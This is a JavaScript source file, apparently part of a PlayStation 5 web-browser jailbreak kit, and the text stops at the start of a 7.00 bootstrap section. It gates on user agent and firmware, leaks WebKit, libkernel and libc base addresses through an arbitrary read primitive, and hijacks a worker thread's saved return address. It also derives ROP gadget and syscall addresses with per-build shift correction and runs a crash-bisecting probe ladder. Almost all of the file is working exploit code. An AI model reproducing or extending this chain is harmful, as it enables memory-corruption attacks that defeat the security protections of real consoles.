// Where the engine's own files (rop_slave.js, core.js, ...) live, and where the
// site root (offsets/, payloads/, ui/) lives, both relative to the *document*.
// slopkit/poops.html is inside slopkit/ so it keeps the historical defaults;
// the unified index.html at the site root overrides them before loading this.
var SLOPKIT_DIR = (typeof window !== "undefined" && window.SLOP_DIR !== undefined)
    ? window.SLOP_DIR : "";
var SLOPKIT_ROOT = (typeof window !== "undefined" && window.SLOP_ROOT !== undefined)
    ? window.SLOP_ROOT : "../";

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = [
    "7.00", "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
];
const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {

    alert(`Firmware ${fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
    throw new Error("no offsets for fw " + fw_str);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    /* Collect EVERY thread with a 0x80000 stack, not just the first.
       Returning the first match assumes the rop_slave worker is the only
       thread with that stack size and that it is earliest in the list.
       Neither is guaranteed, and picking the wrong one looks identical to a
       wrong OFFSET_lk_worker_wait_return: the fingerprint scan just finds 0.
       The caller now tries all of them. Also bounded -- the original walked
       until next==NULL, which spins forever, synchronously, on a bad list. */
    const MAX_THREADS = 512;
    const stacks = [];
    const sizes = [];
    let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
    for (let i = 0; i < MAX_THREADS && (thread.low != 0x0 || thread.hi != 0x0); i++) {
        if ((thread.low & 7) !== 0 || (thread.hi >>> 0) < 8 || (thread.hi >>> 0) > 9)
            throw new Error("_thread_list entry " + i + " is 0x" + thread.toString()
                + ", not a plausible pthread -- OFFSET_lk__thread_list (0x"
                + OFFSET_lk__thread_list.toString(16) + ") is wrong for this build");
        const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.hi === 0) sizes.push("0x" + stacksz.low.toString(16));
        if (stacksz.low == 0x80000 && stacksz.hi === 0) stacks.push(stack);
        thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    }
    jbmark("WORKER-STACKS", "n=" + stacks.length + "-of=" + sizes.length
        + "-sizes=" + sizes.join(","));
    if (!stacks.length)
        throw new Error("failed to find worker: no 0x80000 stack among "
            + sizes.length + " threads (sizes " + sizes.join(",") + ")");
    return stacks;
}

async function find_worker_return_slot(p, stacks, libKernelBase) {
    if (!Array.isArray(stacks)) stacks = [stacks];
    /* The profile may give one saved PC or a ranked list of them. A list is
       useful because several frames in the wait chain are equally valid pivot
       points -- the first entry that appears exactly once wins, so the profile
       author's ordering picks the frame, not luck. */
    const wants = (Array.isArray(OFFSET_lk_worker_wait_return)
        ? OFFSET_lk_worker_wait_return
        : [OFFSET_lk_worker_wait_return]).map(rva => ({
            rva: rva, addr: libKernelBase.add32(rva)
        }));
    let lastCount = 0;

    // The worker may answer immediately before returning to its idle wait.
    // The exact saved PC is the firmware-specific fingerprint. Do not require
    // the following qword to resemble an RSP: that adjacent slot is ABI/frame
    // layout dependent and 10.60 legitimately does not satisfy that heuristic.
    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (const stack of stacks) {
            for (const want of wants) {
                let hitHere = null, here = 0;
                for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
                    const candidate = stack.add32(offset);
                    const value = p.read8(candidate);
                    if (value.low !== want.addr.low || value.hi !== want.addr.hi)
                        continue;

                    hitHere = candidate;
                    here++;
                }
                if (here === 1) {
                    try { window.__wwrPicked = want.rva; } catch (e) {  }
                    jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hitHere.toString()
                        + "-rva=0x" + want.rva.toString(16)
                        + "-rank=" + wants.indexOf(want)
                        + "-of=" + wants.length
                        + "-stacks=" + stacks.length);
                    return hitHere;
                }
                count += here;
                if (hitHere) hit = hitHere;
            }
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }

    /* The fingerprint is not on the stack. Do not guess a replacement constant:
       we have an arbitrary read, so measure what the idle worker ACTUALLY
       parked on and put it in the error text, which this UI renders in full.
       Sweep the whole 512KB stack for qwords that land inside libkernel_web
       and report the distinct rvas, deepest (highest address) first -- the
       saved PC of the blocking call is the one near the top of the stack.
       Tally counts too: a genuine return address recurs across attempts,
       whereas stale garbage usually appears once. */
    const LK_SPAN = 0x100000;                 // generous libkernel_web image bound
    const seen = new Map();                   // rva -> {n, hi}
    for (const stack of stacks) {
        for (let offset = 0x40000; offset < 0x80000; offset += 0x8) {
            const v = p.read8(stack.add32(offset));
            const rel = (v.hi - libKernelBase.hi) * 0x100000000
                + (v.low - libKernelBase.low);
            if (rel < 0 || rel >= LK_SPAN) continue;
            const e = seen.get(rel);
            if (e) { e.n++; if (offset > e.hi) e.hi = offset; }
            else seen.set(rel, { n: 1, hi: offset });
        }
    }
    const top = [...seen.entries()]
        .sort((a, b) => b[1].hi - a[1].hi)
        .slice(0, 24)
        .map(([rva, e]) => "lk+0x" + rva.toString(16)
            + "@0x" + e.hi.toString(16) + (e.n > 1 ? "x" + e.n : ""));
    /* probe700.html established that on this build a byte in libkernel selects
       WHICH cond_wait_common body pthread_cond_wait actually calls. The saved
       PC only exists in the body that runs, so a fingerprint taken from the
       other one can never match no matter how correct it looks statically. */
    let selNote = "";
    if (typeof OFFSET_lk_cond_wait_selector !== "undefined") {
        const sw = p.read8(libKernelBase.add32(OFFSET_lk_cond_wait_selector));
        selNote = " cond_wait selector (lk+0x"
            + OFFSET_lk_cond_wait_selector.toString(16) + ") = "
            + (sw.low & 0xff)
            + " -- if the profile's fingerprint came from the OTHER body,"
            + " that alone explains count 0.";
    }
    jbmark("WORKER-RET-CANDIDATES", "tried=["
        + wants.map(w => "0x" + w.rva.toString(16)).join(",") + "]"
        + "-found=" + seen.size + "-" + top.join(" ") + selNote);
    throw new Error("worker wait return fingerprint count " + lastCount
        + ", expected 1. OFFSET_lk_worker_wait_return candidates ["
        + wants.map(w => "0x" + w.rva.toString(16)).join(",") + "]"
        + " is not on the worker stack for fw " + window.fw_str + "."
        + " " + stacks.length + " candidate stack(s); "
        + seen.size + " libkernel pointers in the top half,"
        + " highest stack offset first (= OLDEST frame; the parked"
        + " cond_wait PC is among the LOWEST offsets): "
        + (top.length ? top.join("  ") : "NONE")
        + selNote);
}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

/* Crash-persistent breadcrumbs.
   ---------------------------------------------------------------------------
   Once the chain is armed, a mistake kills the WebProcess synchronously: the
   coredump names no address, every queued jbmark is lost, and the screen shows
   whatever it showed before the pivot. That is how 0xa0020307 arrived with the
   log ending at MODULE-BASES. localStorage is the only thing that outlives the
   process, so commit a marker BEFORE each irreversible step and read the trail
   back on the next load -- the last crumb written is where it died. */
/* ?probe=pivot | ?probe=null -- bisect the chain launch.
   The trail says we die AFTER postMessage, i.e. the worker really does return
   through the hijacked frame and control reaches our gadgets; something in the
   chain then kills it. These two probes split that span in half. */
let PROBE = (function () {
    try { return new URLSearchParams(location.search).get("probe") || ""; }
    catch (e) { return ""; }
})();
const CRUMB_KEY = "slopkit-crumbs";
function crumb(tag) {
    try {
        const prev = localStorage.getItem(CRUMB_KEY) || "";
        localStorage.setItem(CRUMB_KEY, prev + (prev ? ">" : "") + tag);
    } catch (e) {  }
}
function crumbsTake() {
    try {
        const v = localStorage.getItem(CRUMB_KEY) || "";
        localStorage.removeItem(CRUMB_KEY);
        return v;
    } catch (e) { return ""; }
}

async function prepare(p) {

    /* Persistent ladder state.
       -----------------------------------------------------------------------
       The crumb trail only describes the LAST run, so any run that does not
       itself execute a probe -- a verdict run, or one that falls through to the
       normal chain -- overwrites it and the ladder restarts from the beginning.
       That is exactly what happened after the probe=w verdict: the next trail
       was a plain null-chain death and the ladder went back to probe=pivot,
       re-answering three settled questions.
       So fold each trail into a persistent record and decide from THAT. Each
       stage ends up either decided (SILENT/ANSWERED, or CRASH after two
       unfinished attempts) or untried, and the ladder simply runs the first
       undecided stage. Monotonic, and immune to intervening runs. */
    const PS_KEY = "slopkit-probe-state";
    const STAGES = ["pivot", "rsp", "w", "p", "g1", "g2", "sj"];
    let ps;
    try { ps = JSON.parse(localStorage.getItem(PS_KEY) || "{}"); } catch (e) { ps = {}; }
    ps.done = ps.done || {};
    ps.tries = ps.tries || {};
    const psSave = () => {
        try { localStorage.setItem(PS_KEY, JSON.stringify(ps)); } catch (e) {  }
    };

    const prevCrumbs = crumbsTake();
    if (prevCrumbs) {
        const parts = prevCrumbs.split(">");
        jbmark("PREV-CRUMBS", "died-after=" + parts.slice(-7).reverse().join("<")
            + " (" + parts.length + " steps)");
        if (parts.indexOf("nc-ok") !== -1) ps.ncDied = false;
        else if (parts.indexOf("nc") !== -1) ps.ncDied = true;
        for (const st of STAGES) {
            const pfx = "probe-" + st + "-";
            if (!parts.some(x => x.indexOf(pfx) === 0)) continue;
            const end = parts.find(x => x === pfx + "SILENT" || x === pfx + "ANSWERED"
                || x.indexOf(pfx + "SILENT-") === 0 || x.indexOf(pfx + "ANSWERED-") === 0);
            if (end) ps.done[st] = end.indexOf("-SILENT") !== -1 ? "SILENT" : "ANSWERED";
            else ps.tries[st] = (ps.tries[st] || 0) + 1;
        }
        psSave();
    }

    /* Seed the ladder with what this console has ALREADY answered, so the
       persistent-state fix does not cost three runs re-deriving them. Every
       value below was observed on hardware and is in the commit history:
         probe=pivot SILENT  -- infloop parked the worker, no crash
         probe=rsp   SILENT  -- pop rsp 0x6eee1 + stack switch both work
         probe=w     CRASH   -- crashed twice without reporting
       Deliberately does NOT seed ncDied: on a firmware where the chain works
       the null chain succeeds, ncDied stays false and no probe ever runs, so a
       stale seed cannot disturb a healthy profile. ?probe=reset clears it. */
    /* Changing how the chain stores invalidates every verdict reached with the
       old one, so stamp the state with the current shape and wipe it when that
       shape changes. Otherwise a seeded w=CRASH would keep blaming a store the
       chain no longer performs. */
    const BASELINE = (typeof OFFSET_wk_store_via_rax !== "undefined"
        && OFFSET_wk_store_via_rax) ? "store-rax" : "store-rsi";
    if (ps.baseline && ps.baseline !== BASELINE) {
        jbmark("PROBE-RESET", "chain shape changed (" + ps.baseline + " -> "
            + BASELINE + ") -- discarding verdicts reached with the old one");
        ps = { done: {}, tries: {}, baseline: BASELINE };
        psSave();
    }
    ps.baseline = BASELINE;

    if (PROBE === "reset") {
        try { localStorage.removeItem(PS_KEY); } catch (e) {  }
        ps = { done: {}, tries: {} };
        PROBE = "";
        jbmark("PROBE-RESET", "ladder state cleared");
    } else if (window.fw_str === "7.00" && !ps.seeded) {
        /* pivot and rsp are properties of the frame and the pivot gadget, so
           they survive a change of store. The w and p verdicts do NOT -- both
           were measured against `mov [rdi], rsi`, which is no longer used. */
        ps.seeded = 1;
        ps.done.pivot = ps.done.pivot || "SILENT";
        ps.done.rsp = ps.done.rsp || "SILENT";
        psSave();
        jbmark("PROBE-SEED", "pivot=SILENT rsp=SILENT carried over (both are"
            + " independent of which store the chain uses)");
    }

    /* Dump everything already known, NOW, before anything can crash.
       jbmarks are queued and flushed periodically, so every mark emitted after
       the last flush dies with the process -- which is why TEXT-MAP and the
       GADGET-SELFTEST summary have never appeared on screen even though they
       ran. Their results are in localStorage regardless, so replay them at the
       top of the run where they are guaranteed to be visible. */
    try {
        const rd = ps.rd || {};
        const rdk = Object.keys(rd);
        if (rdk.length)
            jbmark("TEXT-MAP", rdk.map(k => k + "=" + rd[k]).join(" ")
                + " || readable => DATA (no gadget up there is real);"
                + " FAULT => execute-only code");
        const gt = ps.gt || {};
        const gk = Object.keys(gt);
        if (gk.length) {
            const okN = gk.filter(k => gt[k] === "ok");
            const badN = gk.filter(k => gt[k] !== "ok");
            jbmark("GADGET-STATE", "ok=" + okN.length + " bad=" + badN.length
                + " | BAD: " + (badN.map(k => k.replace(/^exec:|^syscall:/, "")
                    + "=" + gt[k]).join(" ") || "none"));
            jbmark("GADGET-OKLIST", okN.map(k =>
                k.replace(/^exec:|^syscall:/, "")).join(" ") || "none yet");
        }
    } catch (e) {  }

    const verdictOf = (st) => ps.done[st] || ((ps.tries[st] || 0) >= 2 ? "CRASH" : null);
    const G = (n) => "0x" + wk_gadgetmap[n].toString(16);
    const say = (m) => jbmark("PROBE-VERDICT", m);

    if (!PROBE) {
        const pivot = verdictOf("pivot"), rsp = verdictOf("rsp"), w = verdictOf("w");
        const pp = verdictOf("p"), g1 = verdictOf("g1"), g2 = verdictOf("g2");
        if (!ps.ncDied) {
            /* nothing to bisect yet */
        } else if (!pivot) { PROBE = "pivot"; }
        else if (pivot !== "SILENT") {
            say("probe=pivot did not park the worker (" + pivot + "). Only a single"
                + " store happened, so the hijacked slot is not a live return"
                + " address -- the FRAME is wrong. Re-rank OFFSET_lk_worker_wait_return.");
        } else if (!rsp) { PROBE = "rsp"; }
        else if (rsp !== "SILENT") {
            say("`pop rsp` " + G("pop rsp") + " is broken: infloop alone works but"
                + " pivoting through pop rsp does not. Re-derive it.");
        } else if (!w) { PROBE = "w"; }
        else if (w === "SILENT") { PROBE = "sj"; }
        else if (!pp) { PROBE = "p"; }
        else if (pp === "SILENT") {
            const st = BASELINE === "store-rax" ? "mov [rdi], rax" : "mov [rdi], rsi";
            say("both pops park cleanly, so the 8-byte store `" + st + "` " + G(st)
                + " is the broken gadget in offsets/" + window.fw_str + ".js"
                + (BASELINE === "store-rax"
                    ? " -- and that is already the rax route, so BOTH stores are bad."
                    : " -- try OFFSET_wk_store_via_rax = true."));
        } else if (!g1) { PROBE = "g1"; }
        else if (g1 !== "SILENT") {
            say("`pop rdi` " + G("pop rdi") + " is broken: alone, with infloop"
                + " directly after the popped value, it still crashes -- it is not"
                + " `5F C3`, most likely it pops more than one register and"
                + " desyncs the chain.");
        } else if (!g2) { PROBE = "g2"; }
        else if (g2 !== "SILENT") {
            say("`pop rsi` " + G("pop rsi") + " is broken (same test as pop rdi,"
                + " which passed).");
        } else {
            say("pop rdi, pop rsi and infloop are each correct on their own, so"
                + " `mov [rdi], rsi` " + G("mov [rdi], rsi") + " is the broken one.");
        }
        if (PROBE)
            jbmark("PROBE-AUTO", "stage=" + PROBE + " | decided so far: "
                + STAGES.map(x => x + "=" + (verdictOf(x) || "-")).join(" "));
    }

    crumb("prep");

    let textArea = document.createElement("textarea");

    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    let textAreaVtable = p.read8(textAreaVtPtr);

    // 9.00+ has no vtable rva; resolve from the host constructor instead.
    // 7.00's profile also ships host-constructor candidates, so the gate is
    // "does this profile have candidates", not a firmware number -- profiles
    // without them still fall back to the vtable rva below.
    // A candidate is accepted only if it lands page-aligned in the user-module
    // band, so a wrong one is rejected rather than used.
    let libSceNKWebKitBase = null;
    if (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
                    + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
                + ctor.toString(16) + ")");
    } else {
        jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
            + "-ctor=" + (typeof globalThis.__ps5NativeCtor === "number"
                ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
            + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                ? OFFSET_wk_host_constructor_candidates.length : "none"));
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    // once per run, before any racer exists
    /* Which build is the console actually running?
       The PS5 browser caches by URL and index.html itself carries no
       cache-buster, so a reload can serve a stale page that still references an
       old main.js -- twice now a run has been analysed as if it contained a
       change it did not. Stamp the build on screen so that is never in doubt. */
    jbmark("BUILD", "main.js v=63 | if this is not the version just"
        + " pushed, the console is running a CACHED page and the run means"
        + " nothing -- force a reload");

    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    /* Which build is this REALLY, and where does it differ?
       -----------------------------------------------------------------------
       The console reports 7.00.00.70 "_manu" (releases/07.00_t_release_manu,
       release 0x07000070) in its boot log. The profile came from
       PS5UPDATE-devkit-7_00_00_44 -- 26 revisions away and the only 7.00 PUP
       available -- so addresses agree up to the first place the two builds
       diverge and drift after it. That, not a wrong base, is why pop rdi/rsi/
       rsp and mov [rdi],rax work while the shifts, the 8-byte store at
       0x7527f0 and every syscall stub do not.

       Text cannot be compared: libSceNKWebKit's is PF_X only and reading it
       kills the WebProcess. But libSceNKWebKit IMPORTS hundreds of functions
       from libkernel_web and libSceLibcInternal, and the loader has already
       written each callee's real address -- in the build actually running --
       into a GOT slot that lives in readable data. Pair that with the export's
       address in our file and the difference is that function's displacement:

           shift(fn) = read8(wkBase + slot + 0x4000) - lkBase - rva_in_our_file

       85 landmarks for libkernel_web, 66 for libc, plus the modules' own
       relative relocations, plus 200 relocations into libSceNKWebKit's own
       text. Sorted by rva they give a step profile, and a value is trusted
       only where the landmarks either side of it AGREE -- inside a step the
       answer is honestly unknown rather than interpolated.

       21 of the libkernel_web landmarks are syscall stubs whose number is
       readable in our own file, so for those the console address is READ, not
       derived. getpid is one of them. Every read is in mapped RW data, so none
       of this can crash. */
    let SHIFT = { wk: null, lk: null };
    if (typeof OFFSET_lk_import_landmarks !== "undefined") {
        const numOf = (v) => (v.hi >>> 0) * 4294967296 + (v.low >>> 0);
        const wkN = numOf(libSceNKWebKitBase);
        const lkN = numOf(libKernelBase);
        const lcN = numOf(libSceLibcInternalBase);
        const GOT = 0x4000;             // wk's data segments sit one page up
        const slotAt = (slot) =>
            numOf(p.read8(libSceNKWebKitBase.add32(slot + GOT)));
        const viaGot = (tbl, baseN) =>
            tbl.map((e) => [e[0], slotAt(e[1]) - baseN - e[0]]);
        const viaOwn = (b, bN, tbl) =>
            tbl.map((e) => [e[0], numOf(p.read8(b.add32(e[1]))) - bN - e[0]]);
        const steps = (rows) => {
            const g = [];
            for (const r of rows) {
                const last = g[g.length - 1];
                if (last && last.d === r[1]) { last.hi = r[0]; last.n++; }
                else g.push({ d: r[1], lo: r[0], hi: r[0], n: 1 });
            }
            return g;
        };
        const hx = (d) => (d < 0 ? "-0x" : "+0x") + Math.abs(d).toString(16);
        /* One mark per step. The screen truncates at 110 characters and the
           first attempt lost exactly the tail that mattered. */
        const report = (tag, g, lo, hi) => {
            jbmark(tag, g.length + " step(s) / "
                + g.reduce((a, x) => a + x.n, 0) + " probes | "
                + hx(g[0].d) + ".." + hx(g[g.length - 1].d));
            let shown = 0;
            for (let i = 0; i < g.length && shown < 8; i++) {
                if (lo !== undefined && (g[i].hi < lo || g[i].lo > hi)) continue;
                shown++;
                jbmark(tag + "-" + (i + 1), hx(g[i].d) + " @0x"
                    + g[i].lo.toString(16) + "..0x" + g[i].hi.toString(16)
                    + " n=" + g[i].n);
            }
        };
        /* The shift at `rva`, or null when the landmarks bracketing it
           disagree -- i.e. an insertion happened somewhere in between and
           which side of it this address falls on is not known. Guessing there
           is what moved pop r8 wrongly and turned a getpid that returned -1
           into a SIGILL. */
        const at = (rows, rva) => {
            let lo = null, hi = null;
            for (const r of rows) {
                if (r[0] <= rva) lo = r;
                if (r[0] >= rva) { hi = r; break; }
            }
            if (lo && hi) return lo[1] === hi[1] ? lo[1] : null;
            if (lo) return lo[1];       // past the last landmark
            /* BELOW the first landmark is not unknown. The shift function
               starts at 0 at rva 0 and never decreases, so if the first
               landmark still reads 0 then nothing was inserted before it and
               nothing below it can have moved. `ret` 0x42 lives down here, and
               calling it unknown is what blocked the entire gadget map. */
            if (hi && hi[1] === 0) return 0;
            return null;
        };
        /* One landmark in 67 came back +0x7b5e700 -- a NID that resolves to a
           different module than our file says, or a slot that is not what the
           relocation claims. One such row splits an otherwise flat profile
           into three steps and makes every address near it unresolvable, so
           drop anything that is not plausibly a build-to-build displacement. */
        const clean = (rows) => rows.filter(r => r[1] > -0x100000
            && r[1] < 0x100000);
        const byRva = (a, b) => a[0] - b[0];
        /* Published on SHIFT so the same rule can correct the OFFSET_lk_*
           function constants later, rather than being reimplemented there. */
        SHIFT.publish = (rows) => { SHIFT.at = (rva) => at(rows, rva); };

        try {
            /* libc's GOT is a second, denser view of the same thing: it
               imports 132 libkernel_web exports, 34 of them inside the syscall
               stub block against WebKit's 21. Its bias is detected rather than
               assumed -- a wrong one reads the neighbouring slot and the rows
               stop looking like displacements at all. */
            let lcBias = 0, lcBest = -1;
            if (typeof OFFSET_lk_landmarks_via_lc !== "undefined") {
                const probe = OFFSET_lk_landmarks_via_lc.filter((e, i) => i % 9 === 0);
                for (const b of [0, 0x4000, -0x4000]) {
                    const ok = probe.filter((e) => {
                        const d = numOf(p.read8(libSceLibcInternalBase
                            .add32(e[1] + b))) - lkN - e[0];
                        return d > -0x10000 && d < 0x10000;
                    }).length;
                    if (ok > lcBest) { lcBest = ok; lcBias = b; }
                }
                jbmark("SHIFT-LK-VIALC", "bias=" + hx(lcBias) + " plausible="
                    + lcBest + "/" + probe.length);
            }
            const viaLc = (typeof OFFSET_lk_landmarks_via_lc !== "undefined"
                && lcBest > 0)
                ? OFFSET_lk_landmarks_via_lc.map((e) => [e[0],
                    numOf(p.read8(libSceLibcInternalBase.add32(e[1] + lcBias)))
                    - lkN - e[0]])
                : [];
            const lkRows = clean(viaGot(OFFSET_lk_import_landmarks, lkN)
                .concat(viaOwn(libKernelBase, lkN, OFFSET_lk_shift_probe))
                .concat(viaLc))
                .sort(byRva);
            /* Only the steps over the syscall stub block are worth screen
               space; libkernel_web is a 15-step staircase and printing all of
               it pushes the actual run off the top. */
            SHIFT.publish(lkRows);
            report("SHIFT-LK", steps(lkRows), 0x33000, 0x39000);
            const lcRows = clean(viaGot(OFFSET_lc_import_landmarks, lcN))
                .sort(byRva);
            report("SHIFT-LC", steps(lcRows));
            const wkRows = clean(viaOwn(libSceNKWebKitBase, wkN,
                OFFSET_wk_shift_probe.concat(
                    typeof OFFSET_wk_shift_probe_gap !== "undefined"
                        ? OFFSET_wk_shift_probe_gap : [])
                    .map(e => [e[0], e[1] + GOT]))).sort(byRva);
            report("SHIFT-WK", steps(wkRows));

            /* Read, not derived: these 21 stubs are imported by name, so their
               console address comes straight out of the GOT. No bracket, no
               interpolation, and no assumption that the stub grid is
               unchanged -- 7.00.00.70 demonstrably inserted stubs into it. */
            const exact = {};
            let nExact = 0;
            for (const e of OFFSET_lk_syscall_landmarks) {
                const a = slotAt(e[1]) - lkN;
                if (a > 0x1000 && a < 0x60000) {
                    syscall_map[e[0]] = a; exact[e[0]] = 1; nExact++;
                }
            }
            jbmark("SYSCALL-EXACT", nExact + "/"
                + OFFSET_lk_syscall_landmarks.length + " read from the GOT"
                + " | getpid 0x36760->0x"
                + ((syscall_map[0x14] || 0)).toString(16));

            /* Everything else moves by the step it sits in, or not at all. */
            let sFix = 0;
            const gone = [];
            for (const k in syscall_map) {
                if (exact[k]) continue;
                const d = at(lkRows, syscall_map[k]);
                if (d === null) { gone.push(k); continue; }
                syscall_map[k] += d; if (d) sFix++;
            }
            /* A stub whose step is unknown is not "probably fine": the block is
               a 0x20 grid, so a wrong lookup runs a DIFFERENT syscall with
               whatever happens to be in the argument registers. getpid coming
               back as -1 was the harmless version of that; exit, munmap or
               thr_kill would not be. Drop them so a caller fails loudly. */
            for (const k of gone) delete syscall_map[k];
            SHIFT.exact = exact;
            SHIFT.dropped = gone.length;
            SHIFT.goneList = gone.slice();
            const need = { 0x3: "read", 0x4: "write", 0x6: "close",
                0x4a: "mprotect", 0x61: "socket", 0x1c7: "thr_new",
                0x1dd: "mmap", 0x14b: "sched_yield" };
            jbmark("SYSCALL-SHIFTED", sFix + " moved, " + nExact + " exact, "
                + gone.length + " dropped as unresolved");
            jbmark("SYSCALL-NEED", Object.keys(need).map(n =>
                need[n] + (syscall_map[n] ? "" : "=GONE")).join(" "));

            /* Refuse to half-apply the gadget map. If any gadget the chain
               itself runs falls inside a step, moving the others desyncs the
               chain in a way that is far harder to read than leaving all of
               them wrong. */
            const CORE = ["pop rdi", "pop rsi", "pop rdx", "pop rcx", "pop rax",
                "pop rsp", "pop r8", "pop r9", "mov [rdi], rax",
                "mov [rdi], rsi", "ret"];
            const unsure = [];
            for (const k in wk_gadgetmap)
                if (at(wkRows, wk_gadgetmap[k]) === null) unsure.push(k);
            const blocking = unsure.filter(k => CORE.indexOf(k) !== -1);
            if (blocking.length) {
                jbmark("SHIFT-WK-BLOCKED", "not applied: " + blocking.join(",")
                    + " sit inside a step, so their side of it is unknown");
            } else {
                let moved = 0;
                for (const k in wk_gadgetmap) {
                    const d = at(wkRows, wk_gadgetmap[k]);
                    if (d) { wk_gadgetmap[k] += d; moved++; }
                }
                jbmark("SHIFT-WK-APPLIED", moved + " gadget(s) moved"
                    + (unsure.length ? " | left alone: " + unsure.join(",") : "")
                    + " | pop rdx 0x" + wk_gadgetmap["pop rdx"].toString(16));
            }
        } catch (e) {
            jbmark("SHIFT-FAILED", String((e && e.message) || e));
        }
    }

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    /* Some gadgets come from libSceLibcInternal rather than libSceNKWebKit.
       rop.js never cared which module an address is in, and libc measured flat
       across 66 landmarks -- byte-identical between .44 and .70 -- so those
       addresses need neither a shift nor an audit. `pop rdx` is here because
       WebKit's crashes despite reading 5a c3 in our file with +0x0 measured
       around it, which is what a same-size change looks like from the outside. */
    const LC_SOURCED = {};
    if (typeof lc_gadgetmap !== "undefined") {
        for (const g in lc_gadgetmap) {
            gadgets[g] = libSceLibcInternalBase.add32(lc_gadgetmap[g]);
            LC_SOURCED[g] = 1;
        }
        jbmark("GADGET-FROM-LC", Object.keys(lc_gadgetmap).map(g =>
            g + "=lc+0x" + lc_gadgetmap[g].toString(16)).join(" "));
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    /* No gadget byte audit is possible here: libSceNKWebKit .text is
       EXECUTE-ONLY on this build (confirmed on hardware), and a read of an
       execute-only page faults the WebProcess rather than throwing. Gadgets
       can therefore only be tested by running them, which is what the probe
       ladder below does -- one gadget group per run. */
    jbmark("GADGET-AUDIT", "skipped: libSceNKWebKit text is execute-only,"
        + " gadgets can only be validated by executing them");

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    // -----------------------------------------------------------------------
    // 7.00 bootstrap (OFFSET_wk_bootstrap === "selfstack").
    //
